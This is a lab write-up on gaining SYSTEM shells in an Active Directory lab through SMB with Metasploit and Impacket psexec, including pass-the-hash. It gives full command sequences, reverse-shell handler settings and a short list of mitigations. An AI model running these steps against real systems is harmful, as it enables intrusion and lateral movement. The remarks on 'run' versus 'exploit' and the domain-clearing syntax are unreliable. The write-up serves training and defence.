Overview

This lab demonstrates how attackers gain remote shell access in an Active Directory environment using valid credentials and NTLM hashes.

The goal was to simulate a real post-exploitation scenario after credential capture (LLMNR/NBT-NS poisoning) and perform lateral movement using SMB.

Techniques covered:

Metasploit PsExec

Impacket PsExec

Pass-the-Hash authentication

Remote service execution

Tool comparison and failure scenarios

Environment: Virtual AD Lab (Windows Domain + Kali)

Lab Environment
Machine	Role
Kali Linux	Attacker
Windows Server	Domain Controller
Windows 10	Domain Client

Key service:

SMB (Port 445)

Attack Chain Summary

Capture credentials / NTLM hashes

Authenticate over SMB

Upload malicious executable

Create remote Windows service

Execute payload → gain SYSTEM shell

This technique is known as Remote Service Execution via PsExec.

Part 1 — Metasploit PsExec (Password Authentication)
Load module
use exploit/windows/smb/psexec
Configure options
set rhosts <targetIP>
set smbdomain <domain>
set smbuser <username>
set smbpass <password>
Run exploit
exploit
Result

Meterpreter reverse shell opened successfully.

Key indicators:

Authenticated via SMB

Uploaded payload

Created remote service

Reverse TCP session established

Part 2 — Metasploit Pass-the-Hash

Instead of a password, NTLM hashes were used.

Hash format:

LMHASH:NTHASH

Example structure:

aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
Configure module
set smbuser administrator
set smbpass LMHASH:NTHASH
set --clear smbdomain
exploit
Why clear domain?

Metasploit defaults to WORKGROUP.
Local admin attacks require clearing the domain value.

Result

Meterpreter shell obtained without knowing the password.

Part 3 — Impacket PsExec (Password)

Impacket provides a more realistic pentesting toolset.

Command
psexec.py DOMAIN/user:'password'@targetIP
Result

Direct SYSTEM command shell obtained:

C:\Windows\system32>
Part 4 — Impacket Pass-the-Hash
Command
psexec.py administrator@targetIP -hashes LMHASH:NTHASH
Result

Successful SYSTEM shell using only NTLM hash.

This demonstrates why NTLM hashes must be treated as passwords.

Part 5 — Testing Alternative Execution Methods
wmiexec.py
RPC_E_INVALID_HEADER

Failed — WMI/DCOM likely blocked.

smbexec.py
Connection reset by peer

Failed — common on modern Windows.

Tool Reliability
Tool	Method	Reliability
psexec.py	Remote service creation	⭐⭐⭐⭐⭐
wmiexec.py	WMI/DCOM	⭐⭐
smbexec.py	SMB named pipes	⭐

Real pentests typically start with PsExec.

How PsExec Works (Behind the Scenes)

Authenticate to SMB (port 445)

Connect to ADMIN$ share

Upload executable

Create Windows service remotely

Start service

Receive SYSTEM shell

This technique requires local admin privileges.

Security Takeaways

This lab highlights real enterprise risks:

• NTLM hashes = reusable credentials
• SMB admin shares enable remote execution
• Local admin reuse enables lateral movement
• Credential hygiene is critical in AD environments

Mitigations:

Disable LLMNR/NBT-NS

Enforce SMB signing

Limit local admin rights

Implement LAPS

Monitor remote service creation

Skills Demonstrated

Active Directory lab building

Metasploit exploitation

Impacket tool usage

Pass-the-Hash attacks

Lateral movement techniques
Using run vs exploit in Metasploit

During the lab the PsExec module was executed using:

run

Instead of:

exploit
Why this matters

In Metasploit:

Command	Behavior
exploit	Runs exploit once
run	Runs module with smart defaults (preferred in labs)

For most exploit modules they behave the same, but run is commonly used in training and real engagements because:

• It automatically starts required handlers
• It respects payload defaults
• It reduces configuration mistakes
• It’s faster during repeated testing

Final Metasploit Workflow (Corrected)
use exploit/windows/smb/psexec

set rhosts <targetIP>
set smbuser <username>
set smbpass <password>

set LHOST <attackerIP>
set LPORT 4444

run
Output observed
Started reverse TCP handler
Authenticating to SMB
Executing payload
Meterpreter session opened

Successful reverse shell established.

🧠 SHORT ADDITION — PASS-THE-HASH WITH run
set smbuser administrator
set smbpass LMHASH:NTHASH
set --clear smbdomain
run

Again — shell obtained without password.
